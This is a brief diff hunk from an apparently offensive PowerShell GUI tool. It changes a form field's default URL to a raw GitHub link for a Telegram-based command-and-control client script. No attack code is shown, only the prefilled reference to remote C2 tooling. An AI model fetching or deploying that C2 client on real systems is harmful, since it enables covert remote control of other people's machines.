@@ -72,7 +72,7 @@ $ParentInput.Location = New-Object System.Drawing.Point(20, 83)
 $ParentInput.BackColor = "#eeeeee"
 $ParentInput.Width = 400
 $ParentInput.Height = 45
-$ParentInput.Text = "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/TG-C2.ps1"
+$ParentInput.Text = "https://raw.githubusercontent.com/beigeworm/Powershell-Tools-and-Toys/main/Command-and-Control/Telegram-C2-Client.ps1"
 $ParentInput.Multiline = $False
 $ParentInput.Font = 'Microsoft Sans Serif,10,style=Bold'
 
